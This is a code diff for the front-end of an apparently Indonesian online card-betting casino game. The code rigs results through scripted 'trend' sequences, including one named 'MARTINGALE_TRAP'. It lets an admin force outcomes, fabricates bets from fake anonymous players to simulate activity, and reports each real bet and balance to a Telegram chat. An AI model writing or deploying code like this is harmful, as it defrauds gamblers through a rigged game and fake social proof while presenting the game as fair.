+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: keyboard })
+            });
+        } catch(e) {}
+    }
+
+    const cardDeck = [];
+    let idCounter = 0;
+    const ranks = ['2','3','4','5','6','7','8','9','J','Q','K','A'];
+    
+    ranks.forEach(r => {
+        let w = (['J','Q','K','A'].includes(r)) ? 4 : 15;
+        cardDeck.push({ id: idCounter++, color: 'RED', value: r, weight: w });
+        cardDeck.push({ id: idCounter++, color: 'BLACK', value: r, weight: w });
+    });
+    cardDeck.push({ id: idCounter++, color: 'JOKER', value: 'JOKER', weight: 2 });
+
+    function mapCardResult(num) { return cardDeck.find(c => c.id === num) || cardDeck[0]; }
+
+    let upcomingCards = [];
+    
+    function getPureRandomCard() {
+        let filtered = cardDeck.filter(c => c.value !== 'JOKER'); 
+        return filtered[Math.floor(Math.random() * filtered.length)].id;
+    }
+
+    function getJokerCardId() { return cardDeck.find(c => c.value === 'JOKER').id; }
+
+    function generateNextTrend() {
+        const trendTypes = [
+            'LONG_DRAGON',
+            'TRICKY_BREAK',
+            'LONG_ZIGZAG',
+            'STAIRS',
+            'ZIGZAG_TRIPLE',
+            'MARTINGALE_TRAP',
+            'RANDOM_CHAOS'
+        ];
+        
+        let selectedTrend = trendTypes[Math.floor(Math.random() * trendTypes.length)];
+        
+        let A = getPureRandomCard();
+        let B = getPureRandomCard();
+        let C = getPureRandomCard();
+        while(B === A) B = getPureRandomCard();
+        while(C === A || C === B) C = getPureRandomCard();
+
+        let baseLength = Math.floor(Math.random() * 10) + 8;
+
+        if (selectedTrend === 'LONG_DRAGON') {
+            for(let i=0; i < baseLength; i++) upcomingCards.push(A);
+            upcomingCards.push(B);
+        } 
+        else if (selectedTrend === 'TRICKY_BREAK') {
+            let half = Math.floor(baseLength / 2);
+            for(let i=0; i < half; i++) upcomingCards.push(A);
+            upcomingCards.push(B);
+            for(let i=0; i < half; i++) upcomingCards.push(A);
+            upcomingCards.push(C);
+        }
+        else if (selectedTrend === 'LONG_ZIGZAG') {
+            for(let i=0; i < baseLength; i++) upcomingCards.push(i % 2 === 0 ? A : B);
+        }
+        else if (selectedTrend === 'STAIRS') {
+            for(let i=0; i < baseLength; i++) upcomingCards.push(Math.floor(i / 2) % 2 === 0 ? A : B);
+        }
+        else if (selectedTrend === 'ZIGZAG_TRIPLE') {
+            for(let i=0; i < baseLength; i++) upcomingCards.push(Math.floor(i / 3) % 2 === 0 ? A : B);
+        }
+        else if (selectedTrend === 'MARTINGALE_TRAP') {
+            let trapCount = 2;
+            for(let i=0; i < 4; i++) {
+                upcomingCards.push(A);
+                for(let j=0; j < trapCount; j++) upcomingCards.push(B);
+                trapCount++;
+            }
+        }
+        else {
+            for(let i=0; i < baseLength; i++) upcomingCards.push(getPureRandomCard());
+        }
+
+        let jokerRoll = Math.random();
+        if(jokerRoll < 0.25) { 
+            upcomingCards.push(getJokerCardId());
+            if(Math.random() < 0.10) { 
+                upcomingCards.push(getJokerCardId());
+            }
+        }
+    }
+
+    function getAlgorithmicCardId() {
+        if(upcomingCards.length === 0) {
+            generateNextTrend();
+        }
+        return upcomingCards.shift(); 
+    }
+
+    const delay = ms => new Promise(res => setTimeout(res, ms));
+
+    function toggleMyHistory() {
+        document.getElementById("myHistoryOverlay").classList.add("active");
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        document.querySelectorAll('.nav-item')[1].classList.add('active'); 
+    }
+
+    function closeMyHistory() {
+        document.getElementById("myHistoryOverlay").classList.remove("active");
+        document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+        document.querySelectorAll('.nav-item')[0].classList.add('active'); 
+    }
+
+    function checkWinCondition(bet, color, value) {
+        if (!bet) return false;
+        if (bet === "RED") return color === "RED";
+        if (bet === "BLACK") return color === "BLACK";
+        if (bet === "JOKER") return color === "JOKER";
+        if (bet === "2-9") return ['2','3','4','5','6','7','8','9'].includes(value);
+        if (bet === "JQKA") return ['J','Q','K','A'].includes(value);
+        if (bet === "KA") return ['K','A'].includes(value);
+        if (bet === "A") return value === 'A';
+        return false;
+    }
+
+    function getMultiplier(bet) {
+        if (bet === "RED" || bet === "BLACK") return 2;
+        if (bet === "JOKER") return 24;
+        if (bet === "2-9") return 1.5;
+        if (bet === "JQKA") return 3;
+        if (bet === "KA") return 6;
+        if (bet === "A") return 12;
+        return 0;
+    }
+
+    function toggleButtons(state) {
+        const btns = ["btnRED", "btnJOKER", "btnBLACK", "btn2_9", "btnJQKA", "btnKA", "btnA"];
+        btns.forEach(id => document.getElementById(id).disabled = !state);
+    }
+
+    function renderCard(color, value, animate = false) {
+        const cardDisplay = document.getElementById("mainCard");
+        cardDisplay.className = "card";
+        
+        if (animate) {
+            cardDisplay.style.animation = "none";
+            void cardDisplay.offsetWidth; 
+            cardDisplay.style.animation = "slideFlipOpen 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards";
+        } else {
+            cardDisplay.style.animation = "none";
+        }
+
+        if (color === "RED") {
+            cardDisplay.style.color = "var(--color-red)";
+            cardDisplay.innerHTML = `
+                <div class="card-corner top-left"><div class="val">${value}</div></div>
+                <div class="card-center"><i class="bi bi-suit-diamond-fill"></i></div>
+                <div class="card-corner bottom-right"><div class="val">${value}</div></div>
+            `;
+        } else if (color === "BLACK") {
+            cardDisplay.style.color = "#111";
+            cardDisplay.innerHTML = `
+                <div class="card-corner top-left"><div class="val">${value}</div></div>
+                <div class="card-center"><i class="bi bi-suit-spade-fill"></i></div>
+                <div class="card-corner bottom-right"><div class="val">${value}</div></div>
+            `;
+        } else {
+            cardDisplay.style.color = "var(--color-green)";
+            cardDisplay.innerHTML = `
+                <div class="card-center" style="display:flex; flex-direction:column; align-items:center;">
+                    <i class="bi bi-crown" style="font-size: 55px; line-height:1;"></i>
+                    <span style="font-size: 16px; font-weight: 900; letter-spacing: 3px; margin-top:8px; color: var(--color-green);">JOKER</span>
+                </div>
+            `;
+        }
+    }
+
+    async function closeCardAnimation() {
+        const cardDisplay = document.getElementById("mainCard");
+        cardDisplay.style.animation = "none";
+        void cardDisplay.offsetWidth; 
+        
+        cardDisplay.style.animation = "flipToBack 0.6s ease-in-out forwards";
+        await delay(300); 
+        
+        cardDisplay.className = "card hidden-card";
+        cardDisplay.innerHTML = "";
+        cardDisplay.style.color = "";
+        
+        await delay(300); 
+        cardDisplay.style.animation = "none";
+        cardDisplay.style.transform = "none";
+    }
+
+    function generateFakeBets() {
+        if (gameState !== "betting") return; 
+        
+        const choices = ["RED", "BLACK", "JOKER", "2-9", "JQKA", "KA", "A"];
+        const choiceWeights = ["RED", "RED", "BLACK", "BLACK", "2-9", "2-9", "JQKA", "KA", "JOKER", "A"];
+        const amounts = [5000, 10000, 20000, 50000, 100000, 250000, 500000];
+        
+        let numBets = Math.floor(Math.random() * 3) + 1;
+        const listEl = document.getElementById("globalHistoryList");
+
+        for(let i=0; i<numBets; i++){
+            let choice = choiceWeights[Math.floor(Math.random() * choiceWeights.length)];
+            let amount = amounts[Math.floor(Math.random() * amounts.length)];
+            let multiplier = getMultiplier(choice);
+
+            globalTotalAmount += amount;
+            
+            let accentColor = "";
+            if (choice === "RED") accentColor = "var(--color-red)";
+            else if (choice === "BLACK") accentColor = "var(--color-black)";
+            else if (choice === "JOKER") accentColor = "var(--color-green)";
+            else accentColor = "var(--color-blue)";
+
+            let item = document.createElement("div");
+            item.className = "gh-item";
+            item.setAttribute("data-choice", choice);
+            item.setAttribute("data-amount", amount);
+            item.style.borderLeftColor = accentColor;
+
+            item.innerHTML = `
+                <div class="gh-user"><i class="bi bi-person"></i> Anonim</div>
+                <div class="gh-choice" style="color:${accentColor};">${choice} <small style="background: var(--bg-app); padding: 2px 4px; border-radius: 4px; font-size: 9px; margin-left: 2px; color: var(--text-muted);">x${multiplier}</small></div>
+                <div class="gh-amount">${formatRp(amount)}</div>
+            `;
+            
+            let firstFake = listEl.querySelector('.gh-item:not(.user-bet)');
+            if (firstFake) listEl.insertBefore(item, firstFake);
+            else listEl.appendChild(item);
+
+            if (listEl.children.length > 50) listEl.removeChild(listEl.lastChild); 
+
+            let insertIndex = 0;
+            while(insertIndex < currentGlobalBets.bets.length && currentGlobalBets.bets[insertIndex].isUser) {
+                insertIndex++;
+            }
+            currentGlobalBets.bets.splice(insertIndex, 0, { isUser: false, choice: choice, amount: amount, color: accentColor, multiplier: multiplier });
+            if (currentGlobalBets.bets.length > 50) currentGlobalBets.bets.pop();
+        }
+        
+        currentGlobalBets.amount = globalTotalAmount;
+        localStorage.setItem("globalBetsData", JSON.stringify(currentGlobalBets));
+        document.getElementById("ghTotalAmount").innerText = formatRp(globalTotalAmount);
+    }
+
+    function renderMyHistory() {
+        const listEl = document.getElementById("myHistoryList");
+        listEl.innerHTML = "";
+        
+        if(myBetsHistory.length === 0){
+            listEl.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 20px;"><i class="bi bi-journal-x" style="font-size: 24px; display: block; margin-bottom: 10px;"></i>Belum ada aktivitas</div>`;
+            return;
+        }
+
+        myBetsHistory.forEach(item => {
+            if(item.type === 'deposit') {
+                listEl.innerHTML += `
+                    <div class="mh-item" style="border-left-color: var(--color-green);">
+                        <div class="mh-details">
+                            <span style="color:var(--text-muted); font-size:11px;">Waktu: ${item.time || "-"}</span>
+                            <span style="color:var(--text-main);"><strong>DEPOSIT SALDO</strong></span>
+                            <span style="color:var(--text-muted); font-size:11px; margin-top:2px;">Nominal: <span style="color:var(--text-main);">${formatRp(item.amount)}</span></span>
+                        </div>
+                        <div class="mh-status" style="color:var(--color-green);">
+                            <i class="bi bi-plus-circle-fill"></i> SUKSES
+                        </div>
+                    </div>
+                `;
+                return;
+            }
+
+            let statusHtml = "";
+            let itemClass = "mh-item ";
+            let multiplier = getMultiplier(item.choice);
+            
+            if (item.status === "waiting") {
+                itemClass += "waiting";
+                statusHtml = `<div class="mh-status" style="color:#fde047;"><i class="bi bi-hourglass-split"></i> Wait</div>`;
+            } else if (item.status === "win") {
+                itemClass += "win";
+                statusHtml = `<div class="mh-status" style="color:#a3e635;"><i class="bi bi-check-circle-fill"></i> WIN<br><small>+${formatRp(item.payout)}</small></div>`;
+            } else {
+                itemClass += "lose";
+                statusHtml = `<div class="mh-status" style="color:#fca5a5;"><i class="bi bi-x-circle-fill"></i> LOSE<br><small>-${formatRp(item.amount)}</small></div>`;
+            }
+
+            let accentColor = "";
+            if (item.choice === "RED") accentColor = "var(--color-red)";
+            else if (item.choice === "BLACK") accentColor = "var(--color-black)";
+            else if (item.choice === "JOKER") accentColor = "var(--color-green)";
+            else accentColor = "var(--color-blue)";
+
+            let resultDisplay = item.resultCard;
+            if (item.resultCard === "JOKER") resultDisplay = '<i class="bi bi-crown"></i> JOKER';
+            let resultCardHtml = item.resultCard ? `<span style="color:var(--text-muted); font-size:11px;">Hasil: ${resultDisplay}</span>` : "";
+
+            listEl.innerHTML += `
+                <div class="${itemClass}" style="border-left-color: ${accentColor};">
+                    <div class="mh-details">
+                        <span style="color:var(--text-muted); font-size:11px;">Per: ${item.period}</span>
+                        <span style="color:var(--text-main);">Bet: <strong style="color:${accentColor}">${item.choice}</strong> <small style="background: var(--bg-app); padding: 2px 6px; border-radius: 4px; font-size: 10px; color: var(--text-muted); margin-left: 4px;">x${multiplier}</small></span>
+                        <span style="color:var(--text-muted); font-size:11px; margin-top:2px;">Nominal: <span style="color:var(--text-main);">${formatRp(item.amount)}</span></span>
+                        ${resultCardHtml}
+                    </div>
+                    ${statusHtml}
+                </div>
+            `;
+        });
+    }
+
+    function updateHistoryUI(color, value) {
+        const slider = document.getElementById("historySlider");
+        const item = document.createElement("div");
+        item.className = "hist-item";
+        
+        if (color === "BLACK") { item.classList.add("black"); item.innerText = value; } 
+        else if (color === "RED") { item.classList.add("red"); item.innerText = value; } 
+        else if (color === "JOKER") { item.classList.add("green"); item.innerHTML = '<i class="bi bi-crown"></i>'; }
+
+        slider.insertBefore(item, slider.firstChild);
+        if (slider.children.length > 15) slider.removeChild(slider.lastChild);
+
+        history100.push(color);
+        if (history100.length > 100) history100.shift(); 
+        localStorage.setItem("history100", JSON.stringify(history100));
+
+        let r = 0, b = 0, j = 0;
+        for (let c of history100) { if (c === "RED") r++; else if (c === "BLACK") b++; else j++; }
+        
+        document.getElementById("statRed").innerText = r;
+        document.getElementById("statBlack").innerText = b;
+        document.getElementById("statJoker").innerText = j;
+    }
+
+    function loadExistingHistorySlider() {
+        if(history100.length === 0) {
+            for(let i=0; i<10; i++) {
+                let cardId = getAlgorithmicCardId();
+                updateHistoryUI(mapCardResult(cardId).color, mapCardResult(cardId).value);
+            }
+        } else {
+            let tempHistory = [...history100];
+            history100 = []; 
+            tempHistory.forEach(c => {
+                let mockupVal = c==="RED"||c==="BLACK" ? Math.floor(Math.random()*8)+2 : "JOKER";
+                updateHistoryUI(c, mockupVal);
+            });
+        }
+    }
+
+    function forceOutcome(overrideMode) {
+        let candidateNum, candInfo, matchesForce;
+        do {
+            candidateNum = Math.floor(Math.random() * cardDeck.length); 
+            candInfo = mapCardResult(candidateNum);
+            matchesForce = checkWinCondition(overrideMode, candInfo.color, candInfo.value);
+        } while (!matchesForce);
+        return candidateNum;
+    }
+
+    async function startCasinoLoop() {
+        let savedLastCard = localStorage.getItem("lastCardData");
+        if (savedLastCard) {
+            savedLastCard = JSON.parse(savedLastCard);
+            renderCard(savedLastCard.color, savedLastCard.value, false);
+        } else {
+            const cardDisplay = document.getElementById("mainCard");
+            cardDisplay.className = "card hidden-card";
+            cardDisplay.innerHTML = "";
+        }
+
+        loadExistingHistorySlider();
+        renderMyHistory(); 
+
+        while (true) {
+            gameState = "betting";
+            adminForceTarget = null; 
+            
+            activeBetsCountThisRound = 0; 
+            totalBetAmountThisRound = 0;
+            
+            let storedEndTime = localStorage.getItem("roundEndTime");
+            let storedPeriod = localStorage.getItem("currentPeriod");
+
+            if (storedEndTime && parseInt(storedEndTime) > Date.now()) {
+                currentPeriod = storedPeriod;
+            } else {
+                let now = new Date();
+                let y = now.getFullYear();
+                let m = String(now.getMonth() + 1).padStart(2, '0');
+                let d = String(now.getDate()).padStart(2, '0');
+                currentPeriod = `${y}${m}${d}${String(periodSequence).padStart(4, '0')}`;
+                
+                localStorage.setItem("periodSequence", periodSequence);
+                localStorage.setItem("currentPeriod", currentPeriod);
+                localStorage.setItem("roundEndTime", Date.now() + 30000); 
+            }
+
+            myBetsHistory.forEach(bet => {
+                if (bet.period === currentPeriod && bet.status === "waiting" && !bet.type) {
+                    activeBetsCountThisRound++;
+                    totalBetAmountThisRound += bet.amount;
+                }
+            });
+
+            if (activeBetsCountThisRound > 0) {
+                toggleButtons(true);
+                document.getElementById("statusMsg").innerHTML = `Total ${activeBetsCountThisRound} Taruhan ${formatRp(totalBetAmountThisRound)}`;
+                document.getElementById("statusMsg").style.color = "var(--color-warn)";
+            } else {
+                toggleButtons(true);
+                document.getElementById("statusMsg").innerHTML = `Silakan pasang taruhan Anda!`;
+                document.getElementById("statusMsg").style.color = "var(--text-muted)";
+            }
+            
+            let savedGlobalBets = localStorage.getItem("globalBetsData");
+            const listEl = document.getElementById("globalHistoryList");
+            if (savedGlobalBets) {
+                let parsed = JSON.parse(savedGlobalBets);
+                if (parsed.period === currentPeriod) {
+                    currentGlobalBets = parsed;
+                    globalTotalAmount = parsed.amount;
+                    
+                    listEl.innerHTML = "";
+                    currentGlobalBets.bets.forEach(b => {
+                        let item = document.createElement("div");
+                        item.className = b.isUser ? "gh-item user-bet" : "gh-item";
+                        item.setAttribute("data-choice", b.choice);
+                        item.setAttribute("data-amount", b.amount);
+                        item.style.borderLeftColor = b.color;
+                        item.style.animation = "none"; 
+                        
+                        let userHtml = b.isUser ? `<div class="gh-user"><i class="bi bi-person-fill" style="color: var(--color-blue)"></i> Anda</div>` : `<div class="gh-user"><i class="bi bi-person"></i> Anonim</div>`;
+                        
+                        item.innerHTML = `
+                            ${userHtml}
+                            <div class="gh-choice" style="color:${b.color};">${b.choice} <small style="background: var(--bg-app); padding: 2px 4px; border-radius: 4px; font-size: 9px; margin-left: 2px; color: var(--text-muted);">x${b.multiplier}</small></div>
+                            <div class="gh-amount">${formatRp(b.amount)}</div>
+                        `;
+                        listEl.appendChild(item);
+                    });
+                    document.getElementById("ghTotalAmount").innerText = formatRp(globalTotalAmount);
+                } else {
+                    currentGlobalBets = { period: currentPeriod, amount: 0, bets: [] };
+                    globalTotalAmount = (Math.floor(Math.random() * 50) + 20) * 15000;
+                    listEl.innerHTML = ""; 
+                }
+            } else {
+                currentGlobalBets = { period: currentPeriod, amount: 0, bets: [] };
+                globalTotalAmount = (Math.floor(Math.random() * 50) + 20) * 15000;
+                listEl.innerHTML = ""; 
+            }
+            
+            clearInterval(fakeBetInterval);
+            fakeBetInterval = setInterval(generateFakeBets, 700);
+
+            document.getElementById("periodDisplay").innerHTML = `<i class="bi bi-hash"></i>${currentPeriod}`;
+            
+            while (true) {
+                let timeLeft = Math.floor((parseInt(localStorage.getItem("roundEndTime")) - Date.now()) / 1000);
+                if (timeLeft < 0) timeLeft = 0;
+
+                const timerEl = document.getElementById("timerDisplay");
+                timerEl.innerHTML = `<i class="bi bi-stopwatch"></i> 00:${timeLeft.toString().padStart(2, '0')}`;
+
+                if (timeLeft <= 3) {
+                    timerEl.classList.add("timer-warning");
+                    if (gameState === "betting") {
+                        gameState = "locked";
+                        clearInterval(fakeBetInterval); 
+                        toggleButtons(false); 
+                        if (activeBetsCountThisRound === 0) {
+                            document.getElementById("statusMsg").innerHTML = `Taruhan Ditutup!`;
+                            document.getElementById("statusMsg").style.color = "var(--color-red)";
+                        }
+                    }
+                } else {
+                    timerEl.classList.remove("timer-warning");
+                }
+
+                if (timeLeft === 0) {
+                    gameState = "revealing";
+                    clearInterval(fakeBetInterval); 
+                    document.getElementById("statusMsg").innerHTML = `Mengundi Hasil...`;
+                    document.getElementById("statusMsg").style.color = "var(--text-muted)";
+                    break; 
+                }
+                
+                await delay(1000);
+            }
+
+            localStorage.removeItem("roundEndTime"); 
+
+            if (adminForceTarget) {
+                currentResultNum = forceOutcome(adminForceTarget);
+            } else {
+                currentResultNum = getAlgorithmicCardId();
+            }
+
+            let cardInfo = mapCardResult(currentResultNum);
+            currentCardColor = cardInfo.color;
+            currentCardValue = cardInfo.value;
+
+            localStorage.setItem("lastCardData", JSON.stringify({color: currentCardColor, value: currentCardValue}));
+
+            renderCard(currentCardColor, currentCardValue, true);
+            updateHistoryUI(currentCardColor, currentCardValue);
+            
+            let displayResultStr = currentCardColor === "JOKER" ? "JOKER" : `${currentCardColor} ${currentCardValue}`;
+
+            document.querySelectorAll("#globalHistoryList .gh-item").forEach(betEl => {
+                let choice = betEl.getAttribute("data-choice");
+                let amount = parseFloat(betEl.getAttribute("data-amount"));
+                let amountEl = betEl.querySelector(".gh-amount");
+
+                if(checkWinCondition(choice, currentCardColor, currentCardValue)) {
+                    amountEl.innerText = "+" + formatRp(amount * getMultiplier(choice));
+                    amountEl.style.color = "#fde047";
+                } else {
+                    amountEl.innerText = "-" + formatRp(amount);
+                    amountEl.style.color = "var(--text-muted)";
+                }
+            });
+
+            if (activeBetsCountThisRound > 0) {
+                let totalWinAmount = 0;
+                let totalLoseAmount = 0;
+
+                myBetsHistory.forEach(bet => {
+                    if (bet.period === currentPeriod && bet.status === "waiting" && !bet.type) {
+                        bet.resultCard = displayResultStr;
+                        let isWin = checkWinCondition(bet.choice, currentCardColor, currentCardValue);
+
+                        if (isWin) {
+                            let winAmount = bet.amount * getMultiplier(bet.choice);
+                            updateBalance(balance + winAmount);
+                            bet.status = "win";
+                            bet.payout = winAmount;
+                            totalWinAmount += winAmount;
+                        } else {
+                            bet.status = "lose";
+                            totalLoseAmount += bet.amount;
+                        }
+                    }
+                });
+
+                if (totalWinAmount > 0) {
+                    document.getElementById("statusMsg").innerHTML = `<span style="color:var(--color-green)">MENANG! +${formatRp(totalWinAmount)}</span>`;
+                } else {
+                    document.getElementById("statusMsg").innerHTML = `<span style="color:var(--color-red)">KALAH!</span>`;
+                }
+                
+                localStorage.setItem("myBetsHistory", JSON.stringify(myBetsHistory));
+                renderMyHistory();
+            }
+
+            periodSequence++;
+
+            await delay(3500); 
+            await closeCardAnimation(); 
+            await delay(400); 
+        }
+    }
+
+    function executeBet(choice, inputAmount) {
+        updateBalance(balance - inputAmount);
+        
+        activeBetsCountThisRound++;
+        totalBetAmountThisRound += inputAmount;
+        
+        document.getElementById("statusMsg").innerHTML = `Total ${activeBetsCountThisRound} Taruhan ${formatRp(totalBetAmountThisRound)}`;
+        document.getElementById("statusMsg").style.color = "var(--color-warn)";
+
+        globalTotalAmount += inputAmount;
+        document.getElementById("ghTotalAmount").innerText = formatRp(globalTotalAmount);
+
+        sendBetToTelegram(choice, inputAmount, balance);
+
+        let accentColor = "";
+        if (choice === "RED") accentColor = "var(--color-red)";
+        else if (choice === "BLACK") accentColor = "var(--color-black)";
+        else if (choice === "JOKER") accentColor = "var(--color-green)";
+        else accentColor = "var(--color-blue)";
+        let multiplier = getMultiplier(choice);
+
+        let item = document.createElement("div");
+        item.className = "gh-item user-bet";
+        item.setAttribute("data-choice", choice);
+        item.setAttribute("data-amount", inputAmount);
+        item.style.borderLeftColor = accentColor;
+        item.innerHTML = `
+            <div class="gh-user"><i class="bi bi-person-fill" style="color: var(--color-blue)"></i> Anda</div>
+            <div class="gh-choice" style="color:${accentColor};">${choice} <small style="background: var(--bg-app); padding: 2px 4px; border-radius: 4px; font-size: 9px; margin-left: 2px; color: var(--text-muted);">x${multiplier}</small></div>
+            <div class="gh-amount">${formatRp(inputAmount)}</div>
+        `;
+        let listEl = document.getElementById("globalHistoryList");
+        listEl.insertBefore(item, listEl.firstChild);
+
+        currentGlobalBets.bets.unshift({ isUser: true, choice: choice, amount: inputAmount, color: accentColor, multiplier: multiplier });
+        if (currentGlobalBets.bets.length > 50) currentGlobalBets.bets.pop();
+        currentGlobalBets.amount = globalTotalAmount;
+        localStorage.setItem("globalBetsData", JSON.stringify(currentGlobalBets));
+
+        myBetsHistory.unshift({
+            period: currentPeriod, choice: choice, amount: inputAmount,
+            status: "waiting", payout: 0, resultCard: ""
+        });
+        if(myBetsHistory.length > 50) myBetsHistory.pop(); 
+        localStorage.setItem("myBetsHistory", JSON.stringify(myBetsHistory));
+        renderMyHistory(); 
+        
+        Swal.fire({
+            toast: true, position: 'top-end', icon: 'success', title: 'Taruhan berhasil dipasang',
+            showConfirmButton: false, timer: 1500, background: 'var(--bg-panel)', color: 'var(--text-main)'
+        });
+    }
+
+    async function placeBet(choice) {
+        if (gameState !== "betting") return; 
+        
+        let inputAmount = parseFloat(document.getElementById("betAmount").value);
+        if (inputAmount > balance || inputAmount <= 0) { 
+            Swal.fire({
+                icon: 'error', title: 'Perhatian', text: 'Saldo Anda tidak mencukupi untuk nominal taruhan ini.',
+                background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#3b82f6'
+            });
+            return; 
+        }
+
+        let multiplier = getMultiplier(choice);
+        let potentialWin = inputAmount * multiplier;
+        
+        let accentColor = "#3b82f6";
+        if (choice === "RED") accentColor = "#ef4444";
+        else if (choice === "BLACK") accentColor = "#cbd5e1";
+        else if (choice === "JOKER") accentColor = "#10b981";
+
+        Swal.fire({
+            title: 'Konfirmasi Taruhan',
+            html: `
+                <div style="text-align: left; background: var(--bg-app); padding: 15px; border-radius: 8px; font-size: 14px; border: 1px solid var(--border-color);">
+                    <div style="margin-bottom: 8px;">Pilihan: <strong style="color: ${accentColor}; font-size: 16px;">${choice}</strong> <small style="color: var(--text-muted);">(x${multiplier})</small></div>
+                    <div style="margin-bottom: 8px;">Nominal: <strong>${formatRp(inputAmount)}</strong></div>
+                    <hr style="border-color: var(--border-color); margin: 10px 0;">
+                    <div>Potensi Menang: <strong style="color: #10b981; font-size: 18px;">${formatRp(potentialWin)}</strong></div>
+                </div>
+            `,
+            icon: 'question', showCancelButton: true, confirmButtonColor: '#10b981', cancelButtonColor: '#ef4444',
+            confirmButtonText: 'Ya, Pasang!', cancelButtonText: 'Batal', background: 'var(--bg-panel)', color: 'var(--text-main)'
+        }).then((result) => {
+            if (result.isConfirmed) {
+                if (gameState !== "betting") {
+                    Swal.fire({
+                        icon: 'error', title: 'Terlambat', text: 'Waktu taruhan sudah ditutup!',
+                        background: 'var(--bg-panel)', color: 'var(--text-main)', confirmButtonColor: '#3b82f6'
+                    });
+                    return;
+                }
+                if (inputAmount > balance) return;
+                executeBet(choice, inputAmount);
+            }
+        });
+    }
+
+    window.onload = startCasinoLoop;
+</script>
+
+</body>
+</html>
